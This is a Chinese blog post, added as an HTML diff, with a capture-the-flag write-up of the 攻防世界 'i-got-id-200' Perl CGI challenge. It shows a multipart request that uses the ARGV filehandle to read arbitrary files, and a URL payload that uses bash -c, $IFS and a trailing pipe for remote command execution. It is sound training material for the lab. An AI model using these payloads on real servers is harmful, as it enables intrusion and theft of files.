@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>攻防世界web进阶区i-got-id-200超详解 | wumingzhilian</title>
+  <meta name="author" content="wuming" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    
+      <meta name="description" itemprop="description" content="" />
+    
+    <meta property="og:title" content="攻防世界web进阶区i-got-id-200超详解" />
+    
+    <meta property="og:url" content="http://wumingzhilian.github.to/2020/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAi-got-id-200%E8%B6%85%E8%AF%A6%E8%A7%A3/" />
+    
+      <meta name="twitter:card" content="summary" />
+      <meta name="twitter:site" content="@wumingzhilian" />
+      <meta name="twitter:title" content="攻防世界web进阶区i-got-id-200超详解" />
+      
+        <meta name="twitter:description" content="" />
+      
+      
+    
+  
+  <link rel="alternate" href="atom.xml" type="application/atom+xml">
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="highlight-css" href="/css/highlight.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqusjs.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  
+    <script async src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+    <script async src="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqus.js"></script>
+  
+<meta name="generator" content="Hexo 5.0.0"></head>
+<body class="custom-background">
+    <div id="kratos-wrapper">
+        <div id="kratos-page">
+            <div id="kratos-header">
+                <div class="nav-toggle"><a class="kratos-nav-toggle js-kratos-nav-toggle"><i></i></a></div>
+                <header id="kratos-header-section">
+                    <div class="container">
+                        <div class="nav-header">
+                            <div class="color-logo"><a href="/">wumingzhilian</a></div>
+                            <nav id="kratos-menu-wrap">
+                              <ul id="kratos-primary-menu" class="sf-menu">
+                              
+                                
+                                  <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                
+                              
+                                
+                                  <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                
+                              
+                                
+                                  <li><a href="/friends/"><i class="fa fa-mars-double"></i>好伙伴</a></li>
+                                
+                              
+                                
+                                  <li><a href="/about/"><li><i class="fa fa-paper-plane"></i>关于我</a></li>
+                                
+                              
+                              </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </header>
+            </div>
+
+<div class="kratos-start kratos-hero-2">
+    <!-- <div class="kratos-overlay"></div> -->
+    <div class="kratos-cover kratos-cover-2 text-center">
+        <div class="desc desc2 animate-box">
+            <a href="/"><h2>wumingzhilian</h2><br><span></span></a>
+        </div>
+    </div>
+</div>
+
+<div id="kratos-blog-post">
+    <div class="container">
+            <div class="row">
+                
+<div id="main">
+    <section class="col-md-8">
+    <article>
+        <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                <h1 class="kratos-entry-title text-center">攻防世界web进阶区i-got-id-200超详解</h1>
+                
+                <div class="kratos-post-meta text-center">
+                    <span>
+                    <i class="fa fa-calendar"></i> 2020-08-10
+                    <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/CTF/">CTF</a>
+                    <i class="fa fa-user"></i> 作者 wuming
+                    </span>
+                </div>
+            </header>
+            <div class="kratos-post-content">
+                
+                    <div class="kratos-post-inner-toc">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#param"><span class="toc-number">1.1.1.</span> <span class="toc-text">param()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.3.</span> <span class="toc-text">构造远程执行代码</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                
+                <hr />
+                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>提示：嗯刚建了一个网站<br><img src="https://img-blog.csdnimg.cn/20200810084123363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开网页发现三个可以点击的<br><img src="https://img-blog.csdnimg.cn/20200810084139993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>file处存在文件上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20200810084151167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>form处存在xss<br><img src="https://img-blog.csdnimg.cn/20200810084210762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200810084236625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>.pl结尾的都是perl编写的网页文件<br><img src="https://img-blog.csdnimg.cn/20200810092046243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里上传文件会直接进行展示，到这里就没了= =<br>只能看看师傅们的wp<br>师傅们猜测这里后台perl上传代码使用了param(）函数</p>
+<p>这里附上网上大佬们猜测的后台代码</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings; </span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi= CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span> ( $cgi-&gt;upload( <span class="string">&#x27;file&#x27;</span> ) ) &#123; </span><br><span class="line">    <span class="keyword">my</span> $file= $cgi-&gt;param( <span class="string">&#x27;file&#x27;</span> );</span><br><span class="line">     <span class="keyword">while</span> ( &lt;$file&gt; ) &#123; <span class="keyword">print</span> <span class="string">&quot;$_&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先bp抓包，我们新增一条</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------1569827749218</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; </span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">ARGV</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2020081009594660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们盲猜一手，file.pl存在于var/www下<br>使用perl的那个漏洞（大佬的）<br>发现果然查看到了文件<br>和大佬们猜测的不错</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 10 Aug 2020 01:57:50 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1605</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=ISO-8859-1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span></span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> <span class="attr">lang</span>=<span class="string">&quot;en-US&quot;</span> <span class="attr">xml:lang</span>=<span class="string">&quot;en-US&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Perl File Upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Perl File Upload<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">            File: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit!&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit!&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line">#!/usr/bin/perl</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>use strict;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>use warnings;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>use CGI;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>my $cgi = CGI-&gt;new;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>print $cgi-&gt;header;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">&lt;br /&gt;print &lt;&lt; &quot;EndOfHTML&quot;;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span></span></span><br><span class="line"><span class="meta">&lt;br /&gt;</span>    PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> <span class="attr">lang</span>=<span class="string">&quot;en-US&quot;</span> <span class="attr">xml:lang</span>=<span class="string">&quot;en-US&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Perl File Upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Perl File Upload<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>            File: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit!&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit!&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>EndOfHTML</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>if ($cgi-&gt;upload(&#x27;file&#x27;)) &#123;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    my $file = $cgi-&gt;param(&#x27;file&#x27;);</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    while (<span class="tag">&lt;<span class="name">$file</span>&gt;</span>) &#123;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        print &quot;$_&quot;;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>        print &quot;<span class="tag">&lt;<span class="name">br</span> /&gt;</span>&quot;;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>    &#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>print &#x27;<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>&#x27;;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们利用bash命令，进行RCE<br><img src="https://img-blog.csdnimg.cn/20200810100607912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们在kali里面试试语句，发现莫得问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/file.pl?/bin/bash%20-c%20ls<span class="variable">$&#123;IFS&#125;</span>/|</span><br></pre></td></tr></table></figure>
+
+<p>%20是空格，不可以用加号代替，如果在hackbar可以省略不使用，直接空格即可(讲解如下)<br>直接ls是不行的</p>
+<p><img src="https://img-blog.csdnimg.cn/20200810100909474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200810102022746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>直接读取flag即可<br><img src="https://img-blog.csdnimg.cn/2020081010175294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200810102346626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个地方是读取目录的../</p>
+<h3 id="param"><a href="#param" class="headerlink" title="param()"></a>param()</h3><blockquote>
+<p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的:</p>
+</blockquote>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里大佬告诉我们要利用@ARGV这个全局变量</p>
+<p><strong>首先要了解Perl中的ARGV全局特殊文件句柄<br>ARGV：遍历数组变量@ARGV中所有文件名的特殊文件句柄<br>@ARGV：是个全局数组特殊变量，传给脚本的命令行参数列表</strong></p>
+<p>Perl 会将 perl 命令行参数列表放入到数组 @ARGV 中，而默认情况下，这些命令行参数是 Perl 的数据输入源，也就是 说Perl 会以依次将他们当作文件进行读取。这里可以参考C语言的argv{}数组，但不同的是，<br><code>Perl语言的@ARGV中的第一个变量就是参数，而不是文件名。</code><br><strong>Param() 函数会返回一个列表，但只有第一个文件会被放到<file>变量中。</strong></p>
+<p>增加新的上传项，并删除filename，<code>重大漏洞</code>来了</p>
+<p>删除filename后， $file的值（也就是文件名）变为了上传的内容，而输出的文件内容为空</p>
+<p><code>通俗理解就是，新加入的文件内容替换了filename参数，传给了$file变量，&lt;file&gt;句柄中打开文件内容为空</code></p>
+<p>那如果我们利用@ARGV，将$file替换为@ARGV，其句柄就是<ARGV>，就是命令行的参数呀，如果给的参数是文件名，就可以输出第一个文件名的所有内容。<br>这里我们利用以上信息构造，加入新的文件列表，删除filename，文件内容写入ARGV</p>
+<p>那么后端执行，就会把$file的值换为ARGV，也就成了上述test.pl的内容，会把从命令行里读取到的参数，当作文件路径找到并输出。</p>
+<p>那么如何传入命令行参数呢？<strong>其实直接在url给出参数就相当于命令行传参<br>那么，通过ARGV和url的参数就可以达到读取服务器上任意文件的目的</strong></p>
+<h3 id="构造远程执行代码"><a href="#构造远程执行代码" class="headerlink" title="构造远程执行代码"></a>构造远程执行代码</h3><p>这里空格需要用url编码转义，否则不符合http头部格式，不能随便加空格的</p>
+<ul>
+<li>Linux中，/bin/bash 是bash解释器，这句话当作文件名时，首先会去寻找/bin/bash并且输出，那就是执行了解释器的功能<ul>
+<li>bash -c 的语法是，后面跟的第一个参数会当作命令来被bash解析，第二，第三个参数被认为是bash的参数，而不是第一个参数（命令）的参数<br>举个例子：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c ls /</span><br></pre></td></tr></table></figure>
+<p>会执行ls命令，列出当前目录，/会被当做bash的参数，没有意义，会找不到</p>
+<p>如果我们想要列出根目录需要 “ls /”时，需要加入<code>$IFS</code></p>
+<p><code>IFS是linux的特殊变量，默认值是space空格， $是取变量值，$IFS就代表空格</code><br>就可以执行“ls /“的命令了</p>
+<p>若只有 /bin/bash%20-c%20ls$IFS/ 命令会发现没有返回信息</p>
+<p>因为，/etc/passwd本身就是文件，后端代码找到并输出返回在html标签中</p>
+<p>而/bin/bash 一旦被访问输出，就是bash运行环境，整个语句的输出结果在shell的缓冲区里，也就是后台服务器才能看到，并不会输出到html标签中。在linux里我们只需要管道操作就可以指定结果的存放位置了。<br><strong>Tips：Perl open()函数会默认打开一个管道！</strong><br>这里利用Perl open()函数打开的管道，进行劫持，通过“|“操作符，把内容引入open()函数已经打开的管道中，就可以输出到html标签中啦！</p>
+<p>部分转自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wssmiss/article/details/105620355">https://blog.csdn.net/wssmiss/article/details/105620355</a></p>
+
+            </div>
+            
+                <div class="kratos-copyright text-center clearfix">
+                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+                </div>
+            
+            <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                        <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://wumingzhilian.github.to/2020/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAi-got-id-200%E8%B6%85%E8%AF%A6%E8%A7%A3/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://wumingzhilian.github.to/2020/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAi-got-id-200%E8%B6%85%E8%AF%A6%E8%A7%A3/";
+            const title         = "「攻防世界web进阶区i-got-id-200超详解」";
+            const excerpt       = `题目提示：嗯刚建了一个网站打开网页发现三个可以点击的file处存在文件上传
+form处存在xss
+详解.pl结尾的都是perl编写的网页文件这里上传文件会直接进行展示，到这里就没了= =只能看看师傅们的wp师傅们猜测这里后台perl上...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
+                <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        <a class="tag-none-link" href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" rel="tag">web进阶区</a>, <a class="tag-none-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a>
+                    </div>
+                    <div class="pull-date">
+                    <span>最后编辑：2020-08-10</span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
